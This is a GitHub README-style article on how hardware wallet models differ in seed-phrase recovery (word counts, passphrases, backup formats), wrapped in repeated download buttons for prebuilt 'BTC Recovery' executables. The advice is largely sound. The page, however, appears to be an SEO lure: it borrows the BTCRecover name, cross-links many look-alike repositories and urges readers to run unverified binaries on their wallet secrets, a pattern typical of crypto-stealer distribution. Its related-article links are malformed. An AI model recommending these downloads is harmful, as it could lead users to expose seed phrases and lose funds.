<div align="center">
<img src="assets/banner-article.png" alt="How hardware wallet models differ in recovery">
</div>

# How hardware wallet models differ in recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

Two devices from the same maker can behave differently on the day of a restore: word counts vary, one model supports a passphrase and another does not offer it, and the backup format may be words, a file, or a card. The model is part of the recovery facts, not a detail.

## You'll see this if

You are restoring into a different device from the one you set up, or your notes describe a backup that does not match what the new device asks for.

| Difference | What you notice | What to do about it |
|---|---|---|
| Word count: 12, 18 or 24 | the new device asks for a different number | enter what you have; all three are valid |
| Passphrase support | one model asks for a 25th word, another never does | the passphrase restores only where it is offered |
| Backup is a card, not words | nothing to type | the maker's own restore route applies |
| Backup is a file | the device asks for a file, not words | keep the file with the same care as words |
| Address types supported | the first address differs | compare addresses, not balances |
| Firmware era | an old backup is refused | update, then retry before concluding loss |

## Why it happens

The words are standard, the device is not. A recovery phrase is defined by a public standard, so 12, 18 and 24 words are all valid inputs, and any compatible device should accept them  -  which is why the words matter more than the model. What varies is everything around them: whether the device offers a passphrase, how it derives addresses, which scripts it can spend from, and what its own backup looks like.

Passphrase support is the difference that most often looks like loss. A wallet created with a passphrase is a different wallet from the same words without one, and a device that does not offer a passphrase cannot reproduce it. The words alone will restore an empty wallet, and the conclusion "my phrase is wrong" follows quickly and incorrectly: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).

The other difference is the backup format itself. Some models back up to a file or a card rather than to words, and that backup is only restorable through the maker's own route. Words written down as a fallback turn that into a choice rather than a dependency: [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md).

## Fix

Match the model's expectations rather than fighting them, and restore into a device that supports what your backup contains.

1. **Count the words** and write the count down with the phrase; do not assume a model's default is yours: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md).
2. **Ask whether a passphrase was ever set.** If you cannot remember, try the restore with and without one, and compare the first address in each case.
3. **Check the word count against the list**, since every word must come from the standard list whatever the model: [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md).
4. **Restore into a compatible device or a compatible software wallet**, not necessarily the same model, and confirm the first address before moving funds: [Ledger and Trezor seed recovery without the device](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-hardware-wallet-recovery.md).
5. **If the backup is a file or card, use the maker's restore** and keep the file unmodified  -  a re-saved copy can fail the checks the device performs.
6. **Update firmware before concluding a backup is unsupported**, then retry the restore once.
7. **Download the current release from the GitHub releases page** if the recovery involves software rather than a device, and read its help for the formats it accepts: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

Interfaces differ more than people expect, and that costs time. One model asks for words one at a time with suggestions, another allows a paste, a third wants the words confirmed in a scrambled order to prove you hold the backup. None of that changes what is being restored, but a scrambled confirmation is where people discover that one of their written words was wrong. If a device asks you to confirm positions out of order, that check is worth the extra minute: it catches an error before the restore does.

## If that did not work

If the words are accepted but the wallet is empty, the model's derivation is the suspect: an address type the new device does not default to, or a passphrase that was set on the old one. Both are recoverable, and neither is a lost wallet.

If the device refuses the words, the word count or a single word is wrong  -  the same failure a software wallet would report. If it refuses a file backup, the file or the firmware is the cause, not the phrase, because a file backup contains no phrase to check.

And if the backup was never written down because the model's own backup was assumed to be permanent, the maker's route is the only one left. That is the day the missing written copy becomes the whole problem: [Ledger Recover and the alternatives](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-ledger-recover-alternatives.md).

Write the model on the same page as the word count; together they answer most restore questions without the device in hand.

## Prevention

- Record the model, word count, passphrase yes-or-no and address type beside the backup: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
- Write the words down even when the device backs up automatically.
- Test a restore into a spare device or a software wallet once, and re-test after a firmware change.
- Keep the device's own backup file as carefully as the words, and never edit it.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

### Why does the device ask for words in a random order?

To prove the backup is held, not merely present: someone reading a phrase aloud from a page can answer in order without knowing it. Answering out of order is the same check a restore performs, earlier.

## FAQ

### Do 12, 18 and 24 word phrases all restore?

Yes. All three lengths are valid in the same standard, and a compatible device accepts any of them. The count must match what you wrote down, not what the new device suggests.

### Why does my phrase restore an empty wallet on a new device?

Because the original used a passphrase, or a different address type, or a different account index. Compare the first address from the original setup against the restored one to identify which.

### Can I restore a device backup file into another brand?

Not in general: a proprietary backup is restorable through its maker's route. Only the words, exported in the standard, move freely between brands.

### Does the model matter for recovery odds?

Only through the passphrase and address-type possibilities it introduces. The word space is the same, so the arithmetic does not change with the brand.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Ledger and Trezor seed recovery without the device]([Ledger and Trezor seed recovery without the device](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-hardware-wallet-recovery.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [Ledger Recover and the alternatives]([Ledger Recover and the alternatives](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-ledger-recover-alternatives.md))
